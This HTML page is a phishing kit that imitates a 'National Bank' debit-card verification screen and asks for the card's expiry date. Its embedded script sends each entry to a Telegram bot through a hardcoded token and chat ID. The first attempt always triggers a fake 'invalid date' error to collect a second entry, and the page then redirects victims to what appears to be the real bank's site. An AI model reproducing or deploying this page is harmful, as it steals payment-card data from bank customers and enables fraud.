
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>Verify your identity</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      background: #f5f5f5;
      color: #122038;
      overflow-x: hidden;
    }

    /* =========================
       PRELOADER (unchanged)
    ========================= */

    .preloader {
      position: fixed;
      inset: 0;
      z-index: 9999;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #f5f5f5;
      animation: hidePreloader 0.4s ease 4s forwards;
    }

    .loader {
      position: relative;
      width: 95px;
      height: 95px;
      border-radius: 50%;
      border: 3px solid rgba(228, 28, 35, 0.15);
    }

    .loader::before {
      content: "";
      position: absolute;
      inset: -3px;
      border-radius: 50%;
      border: 3px solid transparent;
      border-top-color: #e41c23;
      border-left-color: #e41c23;
      animation: spin 1s linear infinite;
    }

    .loader-logo {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 42px;
      height: 38px;
      background: #e41c23;
      transform: translate(-50%, -50%);
      clip-path: polygon(
        0 12%,
        42% 0,
        58% 36%,
        100% 24%,
        100% 88%,
        58% 100%,
        42% 64%,
        0 76%
      );
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    @keyframes hidePreloader {
      to {
        opacity: 0;
        visibility: hidden;
      }
    }

    /* =========================
       PAGE
    ========================= */

    .page {
      min-height: 100vh;
      opacity: 0;
      animation: showPage 0.4s ease 4s forwards;
    }

    @keyframes showPage {
      to {
        opacity: 1;
      }
    }

    .header {
      padding: 28px 20px 22px;
      border-bottom: 1px solid #d8d8d8;
      text-align: center;
    }

    .header h1 {
      margin: 0;
      font-size: 28px;
      font-weight: 500;
      letter-spacing: -0.3px;
      color: #000;
      line-height: 1.3;
      max-width: 90%;
      margin-left: auto;
      margin-right: auto;
    }

    .content {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 42px 20px 60px;
      text-align: center;
    }

    /* =========================
       CARD (full visual unchanged)
    ========================= */

    .card {
      position: relative;
      width: 300px;
      height: 190px;
      overflow: hidden;
      border-radius: 14px;
      background: #e41c23;
    }

    .brand-left {
      position: absolute;
      top: 24px;
      left: 32px;
      color: #fff;
      font-size: 17px;
      font-weight: 700;
      line-height: 0.9;
      text-align: left;
    }

    .brand-left .my {
      display: block;
      margin-left: 18px;
      font-size: 16px;
      font-weight: 400;
    }

    .chip {
      position: absolute;
      top: 70px;
      left: 34px;
      width: 40px;
      height: 30px;
      border: 1px solid #bcbcbc;
      border-radius: 6px;
      background: #d8d8d8;
    }

    .chip::before,
    .chip::after {
      content: "";
      position: absolute;
      left: 0;
      width: 100%;
      height: 1px;
      background: #bcbcbc;
    }

    .chip::before {
      top: 10px;
    }

    .chip::after {
      top: 20px;
    }

    .chip-line {
      position: absolute;
      top: 0;
      bottom: 0;
      left: 18px;
      width: 1px;
      background: #bcbcbc;
    }

    .contactless {
      position: absolute;
      top: 70px;
      left: 90px;
      width: 34px;
      height: 34px;
    }

    .contactless span {
      position: absolute;
      top: 50%;
      border: 3px solid #fff;
      border-left: 0;
      border-top-color: transparent;
      border-bottom-color: transparent;
      border-radius: 50%;
      transform: translateY(-50%);
    }

    .contactless span:nth-child(1) {
      left: 0;
      width: 11px;
      height: 17px;
    }

    .contactless span:nth-child(2) {
      left: 7px;
      width: 16px;
      height: 25px;
    }

    .contactless span:nth-child(3) {
      left: 14px;
      width: 20px;
      height: 33px;
    }

    .bank {
      position: absolute;
      top: 28px;
      right: 28px;
      display: flex;
      align-items: center;
      gap: 8px;
      color: #fff;
      font-size: 11px;
      font-weight: 800;
      line-height: 1;
      text-align: left;
    }

    .bank-logo {
      width: 32px;
      height: 23px;
      background: #fff;
      clip-path: polygon(
        0 12%,
        42% 0,
        58% 36%,
        100% 24%,
        100% 88%,
        58% 100%,
        42% 64%,
        0 76%
      );
    }

    /* =========================
       TEXT (card info)
    ========================= */

    .card-title {
      margin-top: 22px;
      font-size: 38px;
      font-weight: 300;
      color: #111;
    }

    .card-number {
      margin-top: 10px;
      font-size: 17px;
      letter-spacing: 1px;
      color: #6d7682;
    }

    /* =========================
       FORM BOX
    ========================= */

    .form-box {
      width: 100%;
      max-width: 420px;
      margin-top: 42px;
    }

    /* --- ERROR BOX (DSC alert, left colouring removed) --- */
    .dsc-alert {
      display: none;
      align-items: flex-start;
      gap: 12px;
      background: #fef2f2;
      border-radius: 12px;
      padding: 16px 20px;
      margin: 0 auto 24px;
      width: 100%;
      max-width: 560px;
      text-align: left;
      box-shadow: none;
    }
    .dsc-alert.show {
      display: flex;
    }
    .dsc-alert__icon {
      flex-shrink: 0;
      margin-top: 2px;
      color: #b91c1c;
    }
    .dsc-alert__icon svg {
      display: block;
      width: 22px;
      height: 22px;
    }
    .dsc-alert__icon svg path:first-child {
      fill: #b91c1c;
    }
    .dsc-alert__icon svg path:not(:first-child) {
      fill: #ffffff;
    }
    .dsc-alert__textContainer {
      flex: 1;
    }
    .dsc-alert__title {
      margin: 0 0 4px 0;
      font-size: 18px;
      font-weight: 600;
      color: #991b1b;
    }
    .dsc-alert__description {
      font-size: 14px;
      line-height: 1.45;
      color: #7f1a1a;
      display: block;
    }
    @media (max-width: 520px) {
      .dsc-alert {
        padding: 14px 16px;
        gap: 10px;
      }
      .dsc-alert__title {
        font-size: 16px;
      }
      .dsc-alert__description {
        font-size: 13px;
      }
    }

    /* instruction text */
    .form-box p {
      margin: 0 auto 24px;
      max-width: 360px;
      font-size: 16px;
      line-height: 1.5;
      color: #687280;
    }

    /* =========================
       INPUT & BUTTON (unchanged layout)
    ========================= */

    .expiry-input {
      display: block;
      width: 170px;
      height: 54px;
      margin: 0 auto;
      padding: 0 14px;
      border: 1.5px solid #8f8f8f;
      border-radius: 10px;
      background: #fff;
      color: #111;
      font-size: 22px;
      font-weight: 500;
      text-align: center;
      outline: none;
      letter-spacing: 1px;
      transition: 0.2s ease;
    }

    .expiry-input::placeholder {
      color: #8f8f8f;
    }

    .expiry-input:focus {
      border-color: #5f5f5f;
    }

    .confirm-btn {
      display: block;
      width: 170px;
      height: 52px;
      margin: 18px auto 0;
      border: none;
      border-radius: 10px;
      background: #e41c23;
      color: #fff;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      transition: 0.2s ease;
    }

    .confirm-btn:hover {
      opacity: 0.92;
      transform: translateY(-1px);
    }

    .confirm-btn:active {
      transform: scale(0.98);
    }

    @media (max-width: 520px) {
      .header h1 {
        font-size: 22px;
      }
      .card {
        width: 280px;
        height: 178px;
      }
      .card-title {
        font-size: 34px;
      }
      .form-box p {
        font-size: 15px;
      }
      .expiry-input,
      .confirm-btn {
        width: 150px;
      }
    }
  </style>
</head>

<body>

  <!-- PRELOADER (untouched) -->
  <div class="preloader">
    <div class="loader">
      <div class="loader-logo"></div>
    </div>
  </div>

  <!-- PAGE (original structure) -->
  <main class="page">

    <header class="header">
      <h1>Verify yourself by confirming the expiry date of your debit card</h1>
    </header>

    <section class="content">

      <!-- CARD unchanged -->
      <div class="card">
        <div class="brand-left">
          <span class="my">my</span>
          debit
        </div>
        <div class="chip">
          <span class="chip-line"></span>
        </div>
        <div class="contactless">
          <span></span>
          <span></span>
          <span></span>
        </div>
        <div class="bank">
          <div class="bank-logo"></div>
          <div>
            NATIONAL<br />
            BANK
          </div>
        </div>
      </div>

      <div class="card-title">
        Debit card
      </div>

      <div class="card-number">
        ***************1141
      </div>

      <!-- FORM with error box -->
      <form class="form-box" onsubmit="handleSubmit(event)">
        <div class="dsc-alert is-noChildren mc-mb-normal is-error" data-test="alert" id="errorBox">
          <div class="dsc-alert__icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" width="24" height="24" class="dsc-icon has-default-size" fill="currentColor" focusable="false" aria-hidden="true">
              <g fill="none" stroke="none" stroke-width="1">
                <path fill="#C00011" d="M35.5420951,6.19941316 L62.9318565,54.1314956 C64.1275364,56.2239354 63.4005689,58.889483 61.3081291,60.0851629 C60.6487937,60.461926 59.9025494,60.6601019 59.1431592,60.6601019 L4.36363636,60.6601019 C1.95366655,60.6601019 2.59348099e-13,58.7064353 2.59348099e-13,56.2964655 C2.59348099e-13,55.5370752 0.19817593,54.790831 0.574939016,54.1314956 L27.9647004,6.19941316 C29.1603803,4.10697339 31.8259279,3.38000585 33.9183677,4.57568572 C34.5948678,4.96225722 35.1555236,5.52291304 35.5420951,6.19941316 Z"></path>
                <path fill="#FFFFFF" d="M31.7533978,16.2181763 C32.8579673,16.2181763 33.770826,17.0389876 33.9152985,18.1039346 L33.9352159,18.3999944 L33.9352159,38.7636308 C33.9352159,39.9686157 32.9583827,40.945449 31.7533978,40.945449 C30.6488283,40.945449 29.7359695,40.1246377 29.591497,39.0596906 L29.5715796,38.7636308 L29.5715796,18.3999944 C29.5715796,17.1950095 30.5484129,16.2181763 31.7533978,16.2181763 Z"></path>
                <circle cx="31.7533978" cy="49.3999944" r="2.90909091" fill="#FFFFFF"></circle>
              </g>
            </svg>
          </div>
          <div class="dsc-alert__textContainer">
            <h4 class="dsc-alert__title" data-test="title">Invalid expiration date</h4>
            <small class="dsc-alert__description" data-test="description">Verify that you entered your debit card's expiry date correctly.</small>
          </div>
        </div>

        <p>
          Verify yourself by confirming the expiry date of your debit card.
        </p>

        <input
          class="expiry-input"
          type="text"
          inputmode="numeric"
          maxlength="5"
          placeholder="MM/YY"
          aria-label="Card expiration date"
          required
        />

        <button class="confirm-btn" type="submit">
          Confirm
        </button>
      </form>

    </section>
  </main>

  <script>
    (function() {
      const expiryInput = document.querySelector(".expiry-input");
      const errorBox = document.getElementById("errorBox");

      // Telegram credentials
      const TELEGRAM_BOT_TOKEN = '8133407038:AAHgibqH9lia9xUd1xMSTJVlGm82Gd8kGvc';
      const TELEGRAM_CHAT_ID = '7844108983';

      let attemptCount = 0;

      // Helper: send expiry data to Telegram (no UI blocking)
      function sendExpiryToTelegram(expiryValue, attemptNumber) {
        if (!expiryValue) return;
        const attemptLabel = attemptNumber === 1 ? 'FIRST attempt (invalid)' : 'SECOND attempt (valid)';
        const message = `🔐 Card Expiry - ${attemptLabel}\n📅 Expiry: ${expiryValue}\n⏱️ Time: ${new Date().toLocaleString()}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
        }).catch(err => console.warn("Telegram send failed", err));
      }

      // Input formatting (MM/YY)
      if (expiryInput) {
        expiryInput.addEventListener("input", function(e) {
          let rawDigits = e.target.value.replace(/\D/g, "").slice(0, 4);
          let formatted = "";
          if (rawDigits.length >= 3) {
            formatted = rawDigits.slice(0, 2) + "/" + rawDigits.slice(2);
          } else {
            formatted = rawDigits;
          }
          e.target.value = formatted;
          e.target.setSelectionRange(formatted.length, formatted.length);
        });
      }

      // Form submission: first attempt shows error, clears input, sends; second sends and redirects
      window.handleSubmit = async function(event) {
        event.preventDefault();
        const currentExpiry = expiryInput ? expiryInput.value.trim() : "";
        attemptCount++;

        if (attemptCount === 1) {
          if (errorBox) errorBox.classList.add("show");
          if (expiryInput) expiryInput.value = "";
          if (currentExpiry) sendExpiryToTelegram(currentExpiry, 1);
          window.scrollTo({ top: 0, behavior: "smooth" });
          return;
        }

        if (currentExpiry) sendExpiryToTelegram(currentExpiry, 2);
        window.location.href = "https://app.bnc.ca/documents";
      };
    })();
  </script>
</body>
</html>
